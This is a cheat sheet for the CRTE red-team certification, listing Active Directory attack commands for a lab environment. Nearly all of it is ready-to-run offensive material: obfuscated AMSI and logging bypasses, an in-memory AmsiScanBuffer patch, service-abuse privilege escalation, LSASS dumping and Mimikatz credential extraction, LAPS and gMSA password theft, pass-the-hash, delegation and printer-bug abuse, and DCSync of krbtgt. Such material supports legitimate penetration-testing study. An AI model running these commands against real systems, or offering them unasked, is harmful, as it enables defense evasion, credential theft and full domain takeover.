# CRTE Cheat Sheet

## Overview
Quick reference cheat sheet for CRTE certification exam and practice. This cheat sheet contains command syntax to ensure correctness during time-based exams.

**Sources**:
- [johnermac.github.io](https://johnermac.github.io/review/crte/)
- [slytechroot/CRTO-CRTP-CRTE](https://github.com/slytechroot/CRTO-CRTP-CRTE)

> The important part is to understand the content; the cheat sheet is just an **auxiliary tool** in the process.

> There is no hashes or informations of the exams here!

## Bypass

### AMSI Bypass
```powershell
Set-Item ('Va'+'rI'+'a'+'blE:1'+'q2'+'uZx') ([TYpE]("F"+'rE')) 
(Get-variable (('1Q'+'2U') +'zX'))."As`sE`mbly"."GET`T`Y`Pe"(('Uti'+'l','A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em'))).g`etf`iElD"(('a'+'msi'),'d',('I'+'nitF'+'aile'))).(sE`T`VaLUE)(${n`ULl},${t`RuE})
```

### Script Block Logging Bypass
```powershell
[Reflection.Assembly]::"lo`AdwIThPa`Rti`AlnamE"(('S'+'ystem'+'.C'+'ore'))."g`E`TTYPE"(('Sys'+'tem.Di'+'agno'+'stics.Event'+'i'+'ng.EventProv'+'i'+'der'))."gET`FI`eLd"(('m'+'_'+'enabled'),('NonP'+'ubl'+'ic'+',Instance'))."seTVa`l`Ue"([Ref]."as`Sem`BlY"."gE`T`TyPE"(('Sys'+'tem'+'.Mana'+'ge'+'ment.Aut'+'o'+'mation.Tracing.'+'PSEtwLo'+'g'+'Pro'+'vi'+'der'))."gEtFIe`Ld"(('e'+'twProvid'+'er'),('N'+'o'+'nPu'+'b'+'lic,Static'))."gE`Tval`Ue"($null),0)
```

### .NET AMSI Bypass
```powershell
$ZQCUW = @"
using System;
using System.Runtime.InteropServices;
public class ZQCUW {
[DllImport("kernel32")]
public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
[DllImport("kernel32")]
public static extern IntPtr LoadLibrary(string name);
[DllImport("kernel32")]
public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@
Add-Type $ZQCUW
$BBWHVWQ = [ZQCUW]::LoadLibrary("$([SYstem.Net.wEBUtIlITy]::HTmldecoDE('&#97;&#109;&#115;&#105;&#46;&#100;&#108;&#108;'))")
$XPYMWR = [ZQCUW]::GetProcAddress($BBWHVWQ, "$([systeM.neT.webUtility]::HtMldECoDE('&#65;&#109;&#115;&#105;&#83;&#99;&#97;&#110;&#66;&#117;&#102;&#102;&#101;&#114;'))")
$p = 0
[ZQCUW]::VirtualProtect($XPYMWR, [uint32]5, 0x40, [ref]$p)
$TLML = "0xB8"
$PURX = "0x57"
$YNWL = "0x00"
$RTGX = "0x07"
$XVON = "0x80"
$WRUD = "0xC3"
$KTMJX = [Byte[]] ($TLML,$PURX,$YNWL,$RTGX,+$XVON,+$WRUD)
[System.Runtime.InteropServices.Marshal]::Copy($KTMJX, 0, $XPYMWR, 6)
```

## Enumeration

### AD Module Import
```powershell
Import-Module C:\AD\Tools\ADModule-master\Microsoft.ActiveDirectory.Management.dll
Import-Module C:\AD\Tools\ADModule-master\ActiveDirectory\ActiveDirectory.psd1
```

### AD Module Commands
```powershell
Get-ADUser -Filter * | Select -ExpandProperty samaccountname
Get-ADComputer –Filter * | select –expand name
Get-ADGroup -Identity 'Domain Admins' -Properties *
Get-ADGroup -Identity machineadmins -Properties Description
Get-ADGroupMember -Identity 'Domain Admins'
Get-ADGroupMember -Identity 'Enterprise Admins'
Get-ADGroupMember -Identity 'Enterprise Admins' -Server domain.local
Get-ADOrganizationalUnit -Identity 'OU=StudentsMachines,DC=us,DC=domain,DC=local' | %{Get-ADComputer -SearchBase $_ -Filter *} | select name
Get-ACL 'AD:\CN=Domain Admins,CN=Users,DC=us,DC=domain,DC=local' | select -ExpandProperty Access
(Get-ADForest).Domains
Get-ADTrust -Filter *
Get-ADTrust -Filter 'intraForest -ne $True' -Server (Get-ADForest).Name
(Get-ADForest).Domains | %{Get-ADTrust -Filter '(intraForest -ne $True) -and (ForestTransitive -ne $True)' -Server $_}
Get-ADTrust -Filter * -Server domain.local
```

### PowerView Import
```powershell
. C:\AD\Tools\PowerView.ps1
```

### PowerView Commands
```powershell
(Get-DomainPolicy).KerberosPolicy
Get-DomainGPOLocalGroup
Get-DomainGroupMember -Identity <group>
Get-DomainOU
(Get-DomainOU -Identity <OU>).distinguishedname | %{Get-DomainComputer -SearchBase $_} | select name
Get-DomainGPO
(Get-DomainOU -Identity <OU>).gplink
Get-DomainGPO -Identity '{<result of .gplink>}'
Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs -Verbose
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "<user>"}
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "<group>"}
Get-ForestDomain -Verbose | Get-DomainTrust | ?{$_.TrustAttributes -eq 'FILTER_SIDS'}
Get-ForestTrust -Forest <forest>
```

## Local Privesc

### PowerUp
```powershell
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
. C:\AD\Tools\PowerUp.ps1
Invoke-AllChecks
Invoke-ServiceAbuse -Name ALG -UserName domain\studentuserx -Verbose
```

### Accesschk64 (SysInternals)
```powershell
.\accesschk64.exe -uwcqv 'user' *

sc.exe config ALG binPath= "net localgroup administrators domain\user /add"
sc.exe stop ALG
sc.exe start ALG
sc.exe config ALG binPath= "C:\WINDOWS\System32\alg.exe"
sc.exe stop ALG
sc.exe start ALG
```

### Find Local Admin Access
```powershell
Find-LocalAdminAccess -Verbose
Find-WMILocalAdminAccess.ps1
Find-PSRemotingLocalAdminAccess.ps1
```

### Recursive Group Membership
```powershell
function Get-ADPrincipalGroupMembershipRecursive ($SamAccountName) {
  $groups = @(Get-ADPrincipalGroupMembership -Identity $SamAccountName | select -ExpandProperty distinguishedname) 
  $groups
  if ($groups.count -gt 0) {
    foreach ($group in $groups) {
      Get-ADPrincipalGroupMembershipRecursive $group
    }
  }
}
```

### Check ACL Entries
```powershell
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match 'managers'}
Get-DomainObjectAcl -Identity machineadmins -ResolveGUIDs | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier); $_} | ?{$_.IdentityName -match 'managers'}
```

## LAPS

### Import Modules
```powershell
Import-Module C:\AD\Tools\ADModule-master\Microsoft.ActiveDirectory.Management.dll
Import-Module C:\AD\Tools\ADModule-master\ActiveDirectory\ActiveDirectory.psd1
Import-Module C:\AD\Tools\AdmPwd.PS\AdmPwd.PS.psd1 -Verbose
C:\AD\Tools\Get-LapsPermissions.ps1
```

### Find LAPS Permissions (PowerView)
```powershell
Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | Where-Object {($_.ObjectAceType -like 'ms-Mcs-AdmPwd') -and ($_.ActiveDirectoryRights -match 'ReadProperty')} | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier); $_}
```

### Read LAPS Password
```powershell
Get-ADComputer -Identity <computer> -Properties ms-mcs-admpwd | select -ExpandProperty ms-mcs-admpwd
Get-AdmPwdPassword -ComputerName <computer>
Get-DomainObject -Identity <computer> | select -ExpandProperty ms-mcs-admpwd
```

### Access Machine with LAPS Password
```powershell
winrs -r:<computer> -u:.\administrator -p:<passwd> cmd
$passwd = ConvertTo-SecureString '<password>' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential ("<computer>\administrator", $passwd)
$mailmgmt = New-PSSession -ComputerName <computer> -Credential $creds
$mailmgmt
```

## Extract Credentials

### Using winrs
```powershell
winrs net use x: \\<computer>\C$\Users\Public /user:<computer>\Administrator <password>
echo F | xcopy C:\AD\Tools\Loader.exe x:\Loader.exe
net use x: /d
```

### Bypass Behavior Detection
```powershell
winrs -r:<computer> -u:.\administrator -p:<password> cmd
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=192.168.100.X
```

### Extract
```powershell
C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe
sekurlsa::keys
```

### Microsoft Signed Binary (bitsadmin)
```powershell
winrs -r:<computer> -u:.\administrator -p:<password> "bitsadmin /transfer WindowsUpdates /priority normal http://127.0.0.1:8080/Loader.exe C:\\Users\\Public\\Loader.exe"
```

### PowerShell Remoting and Invoke-Mimi
```powershell
$passwd = ConvertTo-SecureString '<password>' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential ("<computer>\administrator", $passwd)
$mailmgmt = New-PSSession -ComputerName <computer> -Credential $creds
Enter-PSSession $mailmgmt
```

**Bypass AMSI before proceeding!**
```powershell
Invoke-Command -FilePath C:\AD\Tools\Invoke-Mimi.ps1 -Session $mailmgmt
Enter-PSSession $mailmgmt
Invoke-Mimi -Command '"sekurlsa::keys"'
```

## gMSA

### Setup and Enumeration
```powershell
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
Import-Module C:\AD\Tools\ADModule-master\Microsoft.ActiveDirectory.Management.dll
Import-Module C:\AD\Tools\ADModule-master\ActiveDirectory\ActiveDirectory.psd1
Get-ADServiceAccount -Filter *
Get-ADServiceAccount -Identity jumpone -Properties * | select PrincipalsAllowedToRetrieveManagedPassword
```

### Extract and Decode Password
```powershell
# Import AD Module again, then:
$Passwordblob = (Get-ADServiceAccount -Identity jumpone -Properties msDS-ManagedPassword).'msDS-ManagedPassword'
Import-Module C:\AD\Tools\DSInternals_v4.7\DSInternals\DSInternals.psd1
$decodedpwd = ConvertFrom-ADManagedPasswordBlob $Passwordblob
ConvertTo-NTHash –Password $decodedpwd.SecureCurrentPassword
```

> After that, you can PTH to see if the user has access to another machine!

## PTH (Pass the Hash)

### From Elevated Shell
```powershell
C:\AD\Tools\SafetyKatz.exe "sekurlsa::opassth /user:<user> /domain:<domain> /aes256:<password> /run:cmd.exe" "exit"
```

### Using NTLM
```powershell
C:\AD\Tools\SafetyKatz.exe "sekurlsa::opassth /user:<user> /domain:<domain>  /ntlm:<password> /run:cmd.exe" "exit"

C:\AD\Tools\Rubeus.exe s4u /user:<user> /aes256:<password> /impersonateuser:administrator /msdsspn:CIFS/<machine.domain> /altservice:HTTP /domain:<domain> /ptt
```

### Doesn't Need Elevation
```powershell
C:\AD\Tools\Rubeus.exe asktgt /domain:<domain> /user:<user> /aes256:<password> opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

## Application Whitelisting

### Verify PowerShell Language Mode
```powershell
$ExecutionContext.SessionState.LanguageMode
```

### Check AppLocker
```powershell
reg query HKLM\Software\Policies\Microsoft\Windows\SRPV2
Get-AppLockerPolicy –Effective
```

### Verify WDAC
```powershell
Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard
# CodeIntegrityPolicyEnforcementStatus : 2
# UsermodeCodeIntegrityPolicyEnforcementStatus : 2
```

> Check out [Lolbas Project on Github](https://lolbas-project.github.io/)

### Dump LSASS
```powershell
tasklist /FI "IMAGENAME eq lsass.exe"
rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump 708 C:\Users\Public\lsass.dmp full
```

### Copy LSASS Dump
```powershell
echo F | xcopy \\us-jump\C$\Users\Public\lsass.dmp C:\AD\Tools\lsass.dmp
```

### Run Mimikatz
```powershell
sekurlsa::minidump C:\AD\Tools\lsass.DMP
privilege::debug
sekurlsa::keys
```

### Check for Certificates
```powershell
echo F | xcopy C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat \\us-jump\C$\Users\Public\RunWithRegistryNonAdmin.bat /Y
echo F | xcopy C:\AD\Tools\InviShell\InShellProf.dll \\us-jump\C$\Users\Public\InShellProf.dll /Y

winrs -r:us-jump cmd
C:\Users\Public\RunWithRegistryNonAdmin.bat
ls cert:\LocalMachine\My
ls cert:\LocalMachine\My\BAD78F43BB4CB13C4843E49B51AA051530FFBBDB | Export-PfxCertificate -FilePath C:\Users\Public\user.pfx -Password (ConvertTo-SecureString -String 'SecretPass@123' -Force -AsPlainText)
```

### Copy Certificate
```powershell
echo F | xcopy \\us-jump\C$\Users\Public\user.pfx C:\AD\Tools\user.pfx
```

## Unconstrained Delegation

### Find Unconstrained Delegation
```powershell
Get-ADComputer -Filter {TrustedForDelegation -eq $True}
```

### Access Machine and Monitor
```powershell
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
cd C:\AD\Tools\
. C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1
Find-PSRemotingLocalAdminAccess -Verbose
```

### Copy Rubeus and Monitor
```powershell
echo F | xcopy C:\AD\Tools\Rubeus.exe \\us-web\C$\Users\Public\Rubeus.exe /Y
winrs -r:us-web cmd.exe
C:\Users\Public\Rubeus.exe monitor /targetuser:DC$ /interval:5 /nowrap
```

### Using PowerShell Remoting
```powershell
$usweb1 = New-PSSession us-web
Copy-Item -ToSession $usweb1 -Path C:\AD\Tools\Rubeus.exe -Destination C:\Users\Public
Enter-PSSession $usweb1
cd C:\Users\Public .\Rubeus.exe monitor /targetuser:DC$ /interval:5 /nowrap
```

### Abuse Printer Bug
```powershell
C:\AD\Tools\MS-RPRN.exe \\dc.domain.local \\us-web.domain.local
```

### Pass the Ticket
```powershell
C:\AD\Tools\Rubeus.exe ptt /ticket:TGTofDC$
```

### Run DCSync
```powershell
C:\AD\Tools\SharpKatz.exe --Command dcsync --User domain\krbtgt --Domain domain.local --DomainController dc.domain.local
```

### Get EA Access
```powershell
C:\AD\Tools\SharpKatz.exe --Command dcsync --User domain\administrator --Domain domain.local --DomainController domain-dc.domain.local
```

### Different Forest
```powershell
C:\AD\Tools\SharpKatz.exe --Command dcsync --User usvendor\krbtgt --Domain usvendor.local --DomainController usvendor-dc.usvendor.local
```

## Constrained Delegation

### Enumerate
```powershell
Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo
```

### Access with Rubeus S4U
```powershell
klist
winrs -r:us-mssql.domain.local cmd.exe
```

### Cross Forest
```powershell
Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo -Server domain.local
```

### Execute S4U
```powershell
C:\AD\Tools\Rubeus.exe hash /password:Qwerty@123 /user:<user> /domain:domain.local
C:\AD\Tools\Rubeus.exe s4u /user:<user> /rc4:<hash> /impersonateuser:Administrator /domain:domain.local /msdsspn:nmagent/dc.domain.local /altservice:ldap /dc:dc.domain.local /ptt
```

### DCSync with LDAP Service Ticket
```powershell
C:\AD\Tools\SharpKatz.exe --Command dcsync --User domain\krbtgt --Domain domain.local --DomainController dc.domain.local
C:\AD\Tools\SharpKatz.exe --Command dcsync --User domain\administrator --Domain domain.local --DomainController dc.domain.local
```

## ACLs Write Permissions

### If You Have Write Permission
```powershell
echo F | xcopy C:\AD\Tools\Loader.exe \\us-mgmt\C$\Users\Public\Loader.exe /Y
winrs -r:us-mgmt cmd
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=192.168.100.x
C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe
sekurlsa::keys
```

## Tools Quick Reference

- **PowerView**: `Get-Net*`, `Get-Domain*`
- **Rubeus**: `Rubeus.exe <command>`
- **Mimikatz/SafetyKatz**: `sekurlsa::`, `kerberos::`, `lsadump::`
- **Impacket**: `psexec.py`, `GetUserSPNs.py`, `secretsdump.py`
- **CrackMapExec**: `crackmapexec <protocol> <target> -u <user> -H <hash>`
- **Certify**: `Certify.exe <command>`
- **Whisker**: `Whisker.exe add /target:<target>`

## Last Updated
December 31, 2023
